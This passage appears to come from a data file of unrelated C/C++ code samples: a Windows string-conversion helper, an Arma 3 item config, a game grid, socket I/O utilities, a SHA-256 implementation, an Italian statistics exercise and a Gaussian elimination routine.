command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  unsigned int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "class CfgPatches\n{\n    class seismicsensor \n    {\n        units[]={};\n        weapons[]={};\n        requiredVersion=0.1;\n        requiredAddons[]={\"A3_Characters_F\"};\n    }\n}\n\n\nclass CfgMagazines\n{\n    class CA_Magazine;\n    class colsog_inv_sensor: CA_Magazine\n    {\n        author = \"Gerard\";\n        mass = 15;\n        scope = 2;\n        value = 1;\n        displayName = \"Seismic sensor\";\n        picture = \"\\seismicsensor\\icons\\icon.paa\";\n        model = \"\\seismicsensor\\objects\\seismicsensor.p3d\";\n        type = 256;\n        count = 1;\n        initSpeed = 18;\n        nameSound = \"handgrenade\";\n        maxLeadSpeed = 6.94444;\n        descriptionShort = \"Seismic sensor\";\n        displayNameShort = \"Seismic sensor\";\n    };\n};\n\nclass CfgVehicles \n{\n    class Thing;\n    class colsog_thing_sensor : Thing  \n    {\n        access = 0;\n        scope = 2;\n        model = \"\\seismicsensor\\objects\\seismicsensor.p3d\";\n        displayName = \"Seismic sensor\";\n        faction = \"Default\";\n        vehicleClass = \"Objects\";\n        simulation = \"thing\";\n        scopecurator = 2;\n        author = \"Gerard\";\n        destrType = \"DestructNo\";\n    };\n};",
    "#include \"Grid.h\"\n\n//constexpr auto grille =\n//\"       \"\n//\" H    G\"\n//\"       \";\n\nGrid::Grid()\n{\t\n\tchar grid[4][15][15] = {\n\t\t{\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'G', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{'H', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', 'S', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '}\n\t\t},\n\t\t{\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', 'H', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', 'G', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'F', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '}\n\t\t},\n\t\t{\n\t\t\t{' ', ' ', 'F', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'G', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', 'G', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', 'S', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'H'},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '}\n\t\t},\n\t\t{\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', 'F', 'F', 'F', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', 'F', ' ', ' ', 'H', ' ', ' ', 'F', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', 'F', ' ', ' ', ' ', 'F', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', 'F', 'F', 'F', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '},\n\t\t\t{' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '}\n\t\t}\n\t};\n\n\thero.m_pos = { 7, 0 };\n\thero.m_charact",
    "/* @Author shigw    @Email sicrve@gmail.com */\r\n\r\n#include \"Util.h\"\r\n\r\n#include <errno.h>\r\n#include <fcntl.h>\r\n#include <netinet/in.h>\r\n#include <netinet/tcp.h>\r\n#include <signal.h>\r\n#include <string.h>\r\n#include <sys/socket.h>\r\n#include <unistd.h>\r\n\r\n\r\nconst int MAX_BUFF = 4096;\r\nssize_t readn(int fd, void *buff, size_t n) {\r\n    size_t nleft = n;\r\n    ssize_t nread = 0;\r\n    ssize_t readSum = 0;\r\n    char *ptr = (char *)buff;\r\n    while (nleft > 0) {\r\n        if ((nread = read(fd, ptr, nleft)) < 0) {\r\n        if (errno == EINTR)\r\n            nread = 0;\r\n        else if (errno == EAGAIN) {\r\n            return readSum;\r\n        } else {\r\n            return -1;\r\n        }\r\n        } else if (nread == 0)\r\n        break;\r\n        readSum += nread;\r\n        nleft -= nread;\r\n        ptr += nread;\r\n    }\r\n    return readSum;\r\n}\r\n\r\nssize_t readn(int fd, std::string &inBuffer, bool &zero) {\r\n    ssize_t nread = 0;\r\n    ssize_t readSum = 0;\r\n    while (true) {\r\n        char buff[MAX_BUFF];\r\n        if ((nread = read(fd, buff, MAX_BUFF)) < 0) {\r\n        if (errno == EINTR)\r\n            continue;\r\n        else if (errno == EAGAIN) {\r\n            return readSum;\r\n        } else {\r\n            perror(\"read error\");\r\n            return -1;\r\n        }\r\n        } else if (nread == 0) {\r\n        // printf(\"redsum = %d\\n\", readSum);\r\n        zero = true;\r\n        break;\r\n        }\r\n        // printf(\"before inBuffer.size() = %d\\n\", inBuffer.size());\r\n        // printf(\"nread = %d\\n\", nread);\r\n        readSum += nread;\r\n        // buff += nread;\r\n        inBuffer += std::string(buff, buff + nread);\r\n        // printf(\"after inBuffer.size() = %d\\n\", inBuffer.size());\r\n    }\r\n    return readSum;\r\n}\r\n\r\nssize_t readn(int fd, std::string &inBuffer) {\r\n    ssize_t nread = 0;\r\n    ssize_t readSum = 0;\r\n    while (true) {\r\n        char buff[MAX_BUFF];\r\n        if ((nread = read(fd, buff, MAX_BUFF)) < 0) {\r\n        if (errno == EINTR)\r\n            continue;\r\n        else if (errno == EAGAIN) {\r\n            return readSum;\r\n        } else {\r\n            perror(\"read error\");\r\n            return -1;\r\n        }\r\n        } else if (nread == 0) {\r\n        // printf(\"redsum = %d\\n\", readSum);\r\n        break;\r\n        }\r\n        // printf(\"before inBuffer.size() = %d\\n\", inBuffer.size());\r\n        // printf(\"nread = %d\\n\", nread);\r\n        readSum += nread;\r\n        // buff += nread;\r\n        inBuffer += std::string(buff, buff + nread);\r\n        // printf(\"after inBuffer.size() = %d\\n\", inBuffer.size());\r\n    }\r\n    return readSum;\r\n}\r\n\r\nssize_t writen(int fd, void *buff, size_t n) {\r\n    size_t nleft = n;\r\n    ssize_t nwritten = 0;\r\n    ssize_t writeSum = 0;\r\n    char *ptr = (char *)buff;\r\n    while (nleft > 0) {\r\n        if ((nwritten = write(fd, ptr, nleft)) <= 0) {\r\n        if (nwritten < 0) {\r\n            if (errno == EINTR) {\r\n            nwritten = 0;\r\n            continue;\r\n            } else if (errno == EAGAIN) {\r\n            return writeSum;\r\n            } else\r\n            return -1;\r\n        }\r\n        }\r\n        writeSum += nwritten;\r\n        nleft -= nwritten;\r\n        ptr += nwritten;\r\n    }\r\n    return writeSum;\r\n}\r\n\r\nssize_t writen(int fd, std::string &sbuff) {\r\n    size_t nleft = sbuff.size();\r\n    ssize_t nwritten = 0;\r\n    ssize_t writeSum = 0;\r\n    const char *ptr = sbuff.c_str();\r\n    while (nleft > 0) {\r\n        if ((nwritten = write(fd, ptr, nleft)) <= 0) {\r\n        if (nwritten < 0) {\r\n            if (errno == EINTR) {\r\n            nwritten = 0;\r\n            continue;\r\n            } else if (errno == EAGAIN)\r\n            break;\r\n            else\r\n            return -1;\r\n        }\r\n        }\r\n        writeSum += nwritten;\r\n        nleft -= nwritten;\r\n        ptr += nwritten;\r\n    }\r\n    if (writeSum == static_cast<int>(sbuff.size()))\r\n        sbuff.clear();\r\n    else\r\n        sbuff = sbuff.substr(writeSum);\r\n    return writeSum;\r\n}\r\n\r\nvoid handle_for_sigpipe() {\r\n    struct sigaction sa;\r\n    memset(&sa, '\\0', sizeof(sa));\r\n    sa.sa_handler = SIG_IGN;\r\n    sa.sa_flags = 0;\r\n    if (sigaction(SIGPIPE, &sa, NULL)) return;\r\n}\r\n\r\nint setSocketNonBlocking(int fd) {\r\n    int flag = fcntl(fd, F_GETFL, 0);\r\n    if (flag == -1) return -1;\r\n\r\n    flag |= O_NONBLOCK;\r\n    if (fcntl(fd, F_SETFL, flag) == -1) return -1;\r\n    return 0;\r\n}\r\n\r\nvoid setSocketNodelay(int fd) {\r\n    int enable = 1;\r\n    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (void *)&enable, sizeof(enable));\r\n}\r\n\r\nvoid setSocketNoLinger(int fd) {\r\n    struct linger linger_;\r\n    linger_.l_onoff = 1;\r\n    linger_.l_linger = 30;\r\n    setsockopt(fd, SOL_SOCKET, SO_LINGER, (const char *)&linger_,\r\n                sizeof(linger_));\r\n}\r\n\r\nvoid shutDownWR(int fd) {\r\n    shutdown(fd, SHUT_WR);\r\n    // printf(\"shutdown\\n\");\r\n}\r\n\r\nint socket_bind_listen(int port) {\r\n    // \u68c0\u67e5port\u503c\uff0c\u53d6\u6b63\u786e\u533a\u95f4\u8303\u56f4\r\n    if (port < 0 || port > 65535) return -1;\r\n\r\n    // \u521b\u5efasocket(IPv4 + TCP)\uff0c\u8fd4\u56de\u76d1\u542c\u63cf\u8ff0\u7b26\r\n    int listen_fd = 0;\r\n    if ((listen_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return -1;\r\n\r\n    /",
    "/*\n * This file is part of the VanitySearch distribution (https://github.com/JeanLucPons/VanitySearch).\n * Copyright (c) 2019 Jean Luc PONS.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, version 3.\n *\n * This program is distributed in the hope that it will be useful, but\n * WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program. If not, see <http://www.gnu.org/licenses/>.\n*/\n\n#include <string.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <inttypes.h>\n#include <string>\n\n#include \"sha256.h\"\n\n#define BSWAP\n\n/// Internal SHA-256 implementation.\nnamespace _sha256\n{\n\n  static const unsigned char pad[64] = { 0x80 };\n\n#ifndef WIN64\n#define _byteswap_ulong __builtin_bswap32\n#define _byteswap_uint64 __builtin_bswap64\ninline uint32_t _rotr(uint32_t x, uint8_t r) {\n  asm(\"rorl %1,%0\" : \"+r\" (x) : \"c\" (r));\n  return x;\n}\n#endif\n\n#define ROR(x,n) _rotr(x, n)\n#define S0(x) (ROR(x,2) ^ ROR(x,13) ^ ROR(x,22))\n#define S1(x) (ROR(x,6) ^ ROR(x,11) ^ ROR(x,25))\n#define s0(x) (ROR(x,7) ^ ROR(x,18) ^ (x >> 3))\n#define s1(x) (ROR(x,17) ^ ROR(x,19) ^ (x >> 10))\n\n#define Maj(x,y,z) ((x&y)^(x&z)^(y&z))\n//#define Ch(x,y,z)  ((x&y)^(~x&z))\n\n// The following functions are equivalent to the above\n//#define Maj(x,y,z) ((x & y) | (z & (x | y)))\n#define Ch(x,y,z) (z ^ (x & (y ^ z)))\n\n// SHA-256 round\n#define Round(a, b, c, d, e, f, g, h, k, w) \\\n    t1 = h + S1(e) + Ch(e,f,g) + k + (w); \\\n    t2 = S0(a) + Maj(a,b,c); \\\n    d += t1; \\\n    h = t1 + t2;\n\n#ifdef BSWAP\n#define WRITEBE32(ptr,x) *((uint32_t *)(ptr)) = _byteswap_ulong(x)\n#define WRITEBE64(ptr,x) *((uint64_t *)(ptr)) = _byteswap_uint64(x)\n#define READBE32(ptr) (uint32_t)_byteswap_ulong(*(uint32_t *)(ptr))\n#else\n#define WRITEBE32(ptr,x) *(ptr) = x\n#define WRITEBE64(ptr,x) *(ptr) = x\n#define READBE32(ptr) *(uint32_t *)(ptr)\n#endif\n\n  // Initialise state\n  void Initialize(uint32_t *s) {\n\n    s[0] = 0x6a09e667ul;\n    s[1] = 0xbb67ae85ul;\n    s[2] = 0x3c6ef372ul;\n    s[3] = 0xa54ff53aul;\n    s[4] = 0x510e527ful;\n    s[5] = 0x9b05688cul;\n    s[6] = 0x1f83d9abul;\n    s[7] = 0x5be0cd19ul;\n\n  }\n\n\n  // Perform SHA-256 transformations, process 64-byte chunks\n  void Transform(uint32_t* s, const unsigned char* chunk)\n  {\n    uint32_t t1;\n    uint32_t t2;\n    uint32_t a = s[0], b = s[1], c = s[2], d = s[3], e = s[4], f = s[5], g = s[6], h = s[7];\n    uint32_t w0, w1, w2, w3, w4, w5, w6, w7, w8, w9, w10, w11, w12, w13, w14, w15;\n\n    Round(a, b, c, d, e, f, g, h, 0x428a2f98, w0 = READBE32(chunk + 0));\n    Round(h, a, b, c, d, e, f, g, 0x71374491, w1 = READBE32(chunk + 4));\n    Round(g, h, a, b, c, d, e, f, 0xb5c0fbcf, w2 = READBE32(chunk + 8));\n    Round(f, g, h, a, b, c, d, e, 0xe9b5dba5, w3 = READBE32(chunk + 12));\n    Round(e, f, g, h, a, b, c, d, 0x3956c25b, w4 = READBE32(chunk + 16));\n    Round(d, e, f, g, h, a, b, c, 0x59f111f1, w5 = READBE32(chunk + 20));\n    Round(c, d, e, f, g, h, a, b, 0x923f82a4, w6 = READBE32(chunk + 24));\n    Round(b, c, d, e, f, g, h, a, 0xab1c5ed5, w7 = READBE32(chunk + 28));\n    Round(a, b, c, d, e, f, g, h, 0xd807aa98, w8 = READBE32(chunk + 32));\n    Round(h, a, b, c, d, e, f, g, 0x12835b01, w9 = READBE32(chunk + 36));\n    Round(g, h, a, b, c, d, e, f, 0x243185be, w10 = READBE32(chunk + 40));\n    Round(f, g, h, a, b, c, d, e, 0x550c7dc3, w11 = READBE32(chunk + 44));\n    Round(e, f, g, h, a, b, c, d, 0x72be5d74, w12 = READBE32(chunk + 48));\n    Round(d, e, f, g, h, a, b, c, 0x80deb1fe, w13 = READBE32(chunk + 52));\n    Round(c, d, e, f, g, h, a, b, 0x9bdc06a7, w14 = READBE32(chunk + 56));\n    Round(b, c, d, e, f, g, h, a, 0xc19bf174, w15 = READBE32(chunk + 60));\n\n    Round(a, b, c, d, e, f, g, h, 0xe49b69c1, w0 += s1(w14) + w9 + s0(w1));\n    Round(h, a, b, c, d, e, f, g, 0xefbe4786, w1 += s1(w15) + w10 + s0(w2));\n    Round(g, h, a, b, c, d, e, f, 0x0fc19dc6, w2 += s1(w0) + w11 + s0(w3));\n    Round(f, g, h, a, b, c, d, e, 0x240ca1cc, w3 += s1(w1) + w12 + s0(w4));\n    Round(e, f, g, h, a, b, c, d, 0x2de92c6f, w4 += s1(w2) + w13 + s0(w5));\n    Round(d, e, f, g, h, a, b, c, 0x4a7484aa, w5 += s1(w3) + w14 + s0(w6));\n    Round(c, d, e, f, g, h, a, b, 0x5cb0a9dc, w6 += s1(w4) + w15 + s0(w7));\n    Round(b, c, d, e, f, g, h, a, 0x76f988da, w7 += s1(w5) + w0 + s0(w8));\n    Round(a, b, c, d, e, f, g, h, 0x983e5152, w8 += s1(w6) + w1 + s0(w9));\n    Round(h, a, b, c, d, e, f, g, 0xa831c66d, w9 += s1(w7) + w2 + s0(w10));\n    Round(g, h, a, b, c, d, e, f, 0xb00327c8, w10 += s1(w8) + w3 + s0(w11));\n    Round(f, g, h, a, b, c, d, e, 0xbf597fc7, w11 += s1(w9) + w4 + s0(w12));\n    Round(e, f, g, h, a, b, c, d, 0xc6e00bf3, w12 += s1(w10) + w5 + s0(w13));\n    Round(d, e, f, g, h, a, b, c, 0xd5a79147, w13 += s1(w11) + w6 + s0(w14));\n    Rou",
    "// Esercizio\r\n\r\n/*\r\n    Inserisci in un vettore VALORI i valori di N misurazioni.\r\n    Calcola la media di questi valori e sucessivamente inserisci \r\n    nell'Array SCARTI la differenza in valore assoluto di ciascun \r\n    elemento di VALORI con la media. Calcola infine lo scarto quadratico\r\n    medio, dato dalla radice quadrata della somma dei quadrati degli scarti\r\n    di i-ennesimi divisa per il numero di valori considerati\r\n*/\r\n\r\n#include<iostream>\r\n#include<cmath>\r\n\r\nusing namespace std;\r\n\r\n// Prototipi\r\nint menu();\r\nbool carica_valori(double valori[],int &x);\r\nvoid controllo_valori(int x);\r\nvoid copy(double valori[],double copy_valori[],int x);\r\nint menu_stampa();\r\nvoid menu_stampa(double valori[],double scarti[],double copy_valori[],int x);\r\nvoid stampa(double valori[],int x);\r\ndouble media_valori(double valori[],int x);\r\nvoid scarti_(double valori[],double scarti[],int x,double media);\r\nvoid ordina(double copy_valori[],int x);\r\nvoid ricerca(double copy_valori[],int x,double chiave);\r\ndouble scarto_quadrato(double scarti[],int x);\r\n\r\n// Colori\r\n#define RESET   \"\\033[0m\"\r\n#define RED     \"\\033[31m\"\r\n#define GREEN   \"\\033[32m\"\r\n#define YELLOW  \"\\033[33m\"\r\n\r\n// Costanti\r\nconst int dim=100;\r\n\r\n\r\nint main(){\r\n\r\n    double valori[dim],copy_valori[dim], scarti[dim], media;\r\n    bool c,c1,c2;\r\n    int s,s1,x,sq;\r\n    c=c1=c2=false;\r\n\r\n    do{\r\n        s=menu();\r\n        switch (s){\r\n\r\n            case 1:{\r\n                c=carica_valori(valori,x);\r\n                cout<<GREEN<<\"Valori caricati!\"<<RESET<<endl;\r\n                copy(valori,copy_valori,x);\r\n                break;\r\n            }\r\n\r\n            case 2:{\r\n    if(!c){\r\n        cout<<RED<<\"Valori non caricati!\"<<RESET<<endl;\r\n        break;\r\n    }\r\n    s1 = menu_stampa();\r\n    switch(s1){\r\n        case 1:{\r\n            stampa(valori, x);\r\n            break;\r\n        }\r\n        case 2:{\r\n            ordina(copy_valori, x);\r\n            stampa(copy_valori, x);\r\n            break;\r\n        }\r\n        case 3:{\r\n            if(!c2){\r\n                media = media_valori(valori, x);\r\n            }\r\n            scarti_(valori, scarti, x, media);\r\n            stampa(scarti, x);\r\n            break;\r\n        }\r\n        case 0:{\r\n            // Torna indietro\r\n            break;\r\n        }\r\n        default:{\r\n            cout<<RED<<\"Scelta non valida!\"<<RESET<<endl;\r\n            break;\r\n        }\r\n    }\r\n    break;\r\n}\r\n\r\n\r\n            case 3:{\r\n                if(!c){\r\n                    cout<<RED<<\"Valori non caricati!\"<<RESET<<endl;\r\n                    break;\r\n                }\r\n                if(!c2){\r\n                    media=media_valori(valori,x);\r\n                }\r\n                cout<<GREEN<<\"Media: \"<<media<<RESET<<endl;\r\n                scarti_(valori,scarti,x,media);\r\n                break;\r\n            }\r\n\r\n            case 4:{\r\n                if(!c){\r\n                    cout<<RED<<\"Valori non caricati!\"<<RESET<<endl;\r\n                    break;\r\n                }\r\n                sq=scarto_quadrato(scarti,x);\r\n                cout<<\"Scarto quadratico medio: \"<<sq<<endl;\r\n                break;\r\n            }\r\n\r\n            case 5:{\r\n                double chiave;\r\n                c1=true;\r\n                if(!c){\r\n                    cout<<RED<<\"Valori non caricati!\"<<RESET<<endl;\r\n                    break;\r\n                }\r\n                ordina(copy_valori,x);\r\n                cout<<\"Inserisci valore da cercare: \";\r\n                cin>>chiave;\r\n                ricerca(copy_valori,x,chiave);\r\n                break;\r\n            }\r\n\r\n            case 0:{\r\n                cout<<GREEN<<\"Arrivederci!\"<<RESET<<endl;\r\n            }\r\n\r\n            default:{\r\n                cout<<RED<<\"Scelta non valida!\"<<RESET<<endl;\r\n                break;\r\n            }\r\n        }\r\n\r\n    }while(s!=0);\r\n\r\n    system (\"pause\");\r\n    return 0;\r\n}\r\n\r\n\r\n// Procedure e funzioni\r\nint menu(){\r\n    int s;\r\n\r\n    cout<<\"\\t-----Menu-----\"<<endl;\r\n    cout<<\"1. Carica valori\"<<endl;\r\n    cout<<\"2. Stampa valori\"<<endl;\r\n    cout<<\"3. Stampa media\"<<endl;\r\n    cout<<\"4. Calcola scarto quadratico medio\"<<endl;\r\n    cout<<\"5. Ricerca valore\"<<endl;\r\n    cout<<\"0. Esci\"<<endl;\r\n\r\n    cout<<\"\\nInserisci scelta: \";\r\n    cin>>s;\r\n\r\n    return s;\r\n}\r\n\r\n\r\nbool carica_valori(double valori[],int &x){\r\n\r\n    char ris;\r\n    int i=0;\r\n\r\n    do{\r\n        cout<<\"Inserisci valore [\"<<i+1<<\"]: \";\r\n        cin>>valori[i];\r\n\r\n        i++;\r\n\r\n        cout<<\"Inserire un altro valore? (S/N): \";\r\n        cin>>ris;\r\n\r\n        ris=toupper(ris);\r\n\r\n        controllo_valori(i+1);\r\n    }while(ris=='S' && i<dim);\r\n\r\n    x=i;\r\n    return true;\r\n}\r\n\r\nvoid controllo_valori(int x){\r\n\r\n    if(x>=dim){\r\n        cout<<YELLOW<<\"ATTENZIONE! Puoi inserire massimo altri \"<<dim-x<<\" valori!\"<<RESET<<endl;\r\n    }\r\n\r\n}\r\n\r\nvoid copy(double valori[],double copy_valori[],int x){\r\n    for(int i=0;i<x;i++){\r\n        copy_valori[i]=valori[i];\r\n    }\r\n}\r\n\r\nint menu_stampa(){\r\n    int s;\r\n\r\n    cout<<\"1. Stampa valo",
    "#include <iostream>\r\n#include <map>\r\n#include <vector>\r\n#include <string>\r\n#include <fstream> \r\n#include \"json.hpp\"  \r\n#include <cmath>    \r\n\r\nusing namespace std;\r\nusing json = nlohmann::json;\r\n\r\n// Function to decode y value from a given base\r\nlong long decodeBase(const string& value, int base) {\r\n    long long decodedValue = 0;\r\n    int len = value.size();\r\n    for (int i = 0; i < len; ++i) {\r\n        char digit = value[i];\r\n        int num;\r\n        if (digit >= '0' && digit <= '9') {\r\n            num = digit - '0';\r\n        } else if (digit >= 'A' && digit <= 'Z') {\r\n            num = digit - 'A' + 10;  // For bases greater than 10\r\n        } else {\r\n            cerr << \"Invalid character in base representation: \" << digit << endl;\r\n            exit(EXIT_FAILURE);\r\n        }\r\n        if (num >= base) {\r\n            cerr << \"Digit \" << digit << \" is out of range for base \" << base << endl;\r\n            exit(EXIT_FAILURE);\r\n        }\r\n        decodedValue = decodedValue * base + num;\r\n    }\r\n    return decodedValue;\r\n}\r\n\r\n// Gaussian elimination to solve system of linear equations\r\nvector<double> gaussianElimination(vector<vector<double>>& matrix, int n) {\r\n    for (int i = 0; i < n; i++) {\r\n        // Find pivot element\r\n        int pivotRow = i;\r\n        for (int k = i + 1; k < n; k++) {\r\n            if (fabs(matrix[k][i]) > fabs(matrix[pivotRow][i])) {\r\n                pivotRow = k;\r\n            }\r\n        }\r\n        // Swap rows if necessary\r\n        if (pivotRow != i) {\r\n            swap(matrix[i], matrix[pivotRow]);\r\n        }\r\n        \r\n        // Make the diagonal element 1 and eliminate below\r\n        double pivot = matrix[i][i];\r\n        for (int j = 0; j <= n; j++) {\r\n            matrix[i][j] /= pivot;\r\n        }\r\n        for (int k = i + 1; k < n; k++) {\r\n            double factor = matrix[k][i];\r\n            for (int j = 0; j <= n; j++) {\r\n                matrix[k][j] -= factor * matrix[i][j];\r\n            }\r\n 